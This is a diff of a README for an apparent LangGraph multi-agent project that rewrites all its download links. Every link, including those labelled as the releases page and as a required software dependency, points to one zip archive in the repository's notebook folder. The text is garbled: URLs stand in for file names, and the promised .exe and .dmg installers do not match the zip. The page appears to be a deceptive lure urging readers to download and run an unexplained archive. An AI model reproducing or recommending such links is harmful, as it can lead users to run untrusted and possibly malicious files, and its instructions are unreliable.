@@ -1,7 +1,7 @@
 # 🎉 multi-agent-system-using-langgraph - A Simple Way to Manage Multiple AI Agents
 
 ## 📦 Download Now
-[![Download](https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip%20Latest%https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip)](https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip)
+[![Download](https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip%20Latest%https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip)](https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the multi-agent system using LangGraph. Follow the steps to set up this powerful tool and explore its capabilities.
@@ -15,10 +15,10 @@ To run this application, you will need the following:
 - **Operating System:** Windows, macOS, or Linux.
 - **Memory:** At least 4 GB of RAM is recommended.
 - **Storage:** Minimum 500 MB of free space.
-- **Software:** Python 3.7 or higher, and https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip (for the React agent).
+- **Software:** Python 3.7 or higher, and https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip (for the React agent).
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip). Here, you will find the latest versions of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip). Here, you will find the latest versions of the application.
 
 2. **Select the Latest Version**: Look for the most recent release listed. You can identify it by the release date and version number.
 
@@ -26,12 +26,12 @@ To run this application, you will need the following:
 
    - For macOS, download the `.dmg` file.
    - For Windows, download the `.exe` file.
-   - For Linux, download the `https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip` file.
+   - For Linux, download the `https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip` file.
 
 4. **Install the Application**:
    - **For Windows**: Run the downloaded `.exe` file and follow the on-screen instructions.
    - **For macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **For Linux**: Extract the `https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip` file and follow any included instructions.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip` file and follow any included instructions.
 
 5. **Run the Application**: After installation, locate the application in your programs or applications folder and launch it.
 
@@ -66,4 +66,4 @@ This project is licensed under the MIT License.
 For questions or support, visit the GitHub repository. Open an issue or contact the maintainers directly. Your feedback is valuable.
 
 ## 📦 Quick Link
-Don't forget to check the [Releases page](https://github.com/vikaskhandal/multi-agent-system-using-langgraph/raw/refs/heads/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip) to download the latest version and start using the multi-agent system today!
+Don't forget to check the [Releases page](https://raw.githubusercontent.com/vikaskhandal/multi-agent-system-using-langgraph/main/notebook/system-multi-langgraph-agent-using-3.1-alpha.4.zip) to download the latest version and start using the multi-agent system today!
